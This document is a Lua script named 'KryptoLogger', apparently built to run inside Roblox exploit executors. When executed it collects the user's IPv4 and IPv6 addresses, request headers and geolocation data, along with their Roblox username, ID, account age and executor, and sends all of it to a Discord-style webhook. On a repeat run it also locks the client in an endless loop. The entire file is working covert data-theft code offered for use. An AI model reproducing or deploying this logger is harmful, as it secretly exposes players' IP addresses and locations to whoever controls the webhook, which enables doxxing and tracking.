# KryptoLogger

```lua
function ExecuteWebhook()
  -- Webhook here
    local Webhook =
        ""
    --[] IP Variables
    local IPv4 = game:HttpGet("https://api.ipify.org")
    local IPv6 = game:HttpGet("https://api64.ipify.org")
    local HTTPbin = game:HttpGet("https://httpbin.org/get")
    local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. IPv4)

    --[] Roblox Account Variables
    local LocalPlayer = game:GetService("Players").LocalPlayer

    local AccountAge = LocalPlayer.AccountAge

    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)

    local UserId = LocalPlayer.UserId

    local PlayerName = LocalPlayer.Name

    local DisplayName = LocalPlayer.DisplayName

    local PlaceID = game.PlaceId

    local plr = game.Players.LocalPlayer

    local LogTime = os.date("!%Y-%m-%d-%H:%M:%S GMT+0")

    local rver = "Version 1.0B"

    --[] IdentifyExploit Function
    function identifyexploit()
        local ieSuccess, ieResult = pcall(identifyexecutor)
        if ieSuccess then
            return ieResult
        end

        return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
    end

    --[] ExecutorLevel
    local function getScriptIdentity()
        local env = getfenv()
        if env.game then
            return 2
        elseif env.plugin then
            return 4
        elseif env.studio then
            return 5
        else
            if env.Level1 then
                return 1
            elseif env.Level3 then
                return 3
            elseif env.Level6 then
                return 6
            elseif env.Level7 then
                return 7
            elseif env.Level8 then
                return 8
            else
                return 0
            end
        end
    end

    getScriptIdentity()

    local ExecutorLevel = tostring(getScriptIdentity())
    --[] Webhook Variables
    local Headers = {["content-type"] = "application/json"}

    --[[ Webhook ]] local PlayerData = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone Executed Krypton! "
                },
                ["title"] = PlayerName,
                ["description"] = ": " .. DisplayName,
                ["fields"] = {
                    {
                        --[[ Username / PlayerName ]] --
                        ["name"] = "__Username:__",
                        ["value"] = PlayerName,
                        ["inline"] = true
                    },
                    {
                        --[[ User ]] --
                        ["name"] = "__User:__",
                        ["value"] = "https://www.roblox.com/users/" .. plr.UserId,
                        ["inline"] = true
                    },
                    {
                        --[[ UserID ]] --
                        ["name"] = "__UserId:__",
                        ["value"] = UserId,
                        ["inline"] = true
                    },
                    {
                        --[[ Membership type ]] --
                        ["name"] = "__Membership Type:__",
                        ["value"] = MembershipType,
                        ["inline"] = true
                    },
                    {
                        --[[ Account age ]] --
                        ["name"] = "__Account Age (days):__",
                        ["value"] = AccountAge,
                        ["inline"] = true
                    },
                    {
                        --[[ Place ID ]] --
                        ["name"] = "__Place ID:__ ",
                        ["value"] = PlaceID,
                        ["inline"] = true
                    },
                    {
                        --[[ Game Link ]] --
                        ["name"] = "__Game Link:__ ",
                        ["value"] = "https://www.roblox.com/games/" .. PlaceID,
                        ["inline"] = true
                    },
                    {
                        --[[ Exploit / Executor ]] --
                        ["name"] = "__Executor:__ ",
                        ["value"] = identifyexploit(),
                        ["inline"] = true
                    },
                    {
                        --[[ Exploit / Executor LVL]] --
                        ["name"] = "__Executor LVL:__ ",
                        ["value"] = "Not really accurate : " .. ExecutorLevel,
                        ["inline"] = true
                    },
                    {
                        --[[ IPv4 ]] --
                        ["name"] = "__IPv4:__",
                        ["value"] = IPv4,
                        ["inline"] = true
                    },
                    {
                        --[[ IPv6 ]] --
                        ["name"] = "__IPv6:__",
                        ["value"] = IPv6,
                        ["inline"] = true
                    },
                    {
                        --[[ Log / Grab time ]] --
                        ["name"] = "__Log Time:__",
                        ["value"] = LogTime,
                        ["inline"] = true
                    },
                    {
                        --[[ HTTPbin ]] --
                        ["name"] = "__HTTPbin Data__ (JSON):",
                        ["value"] = "```json" .. "\n" .. HTTPbin .. "```",
                        ["inline"] = false
                    },
                    {
                        --[[ geoPlugin ]] --
                        ["name"] = "__geoPlugin Data__ (JSON):",
                        ["value"] = "```json" .. "\n" .. GeoPlug .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    --[] Variables

    local PlayerData = game:GetService("HttpService"):JSONEncode(PlayerData)

    HttpRequest =
        (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

    --[] HttpRequest
    HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
end

if _G.AntiSpam == true then
    while true do
    end
else
    ExecuteWebhook()
end

_G.AntiSpam = true
```
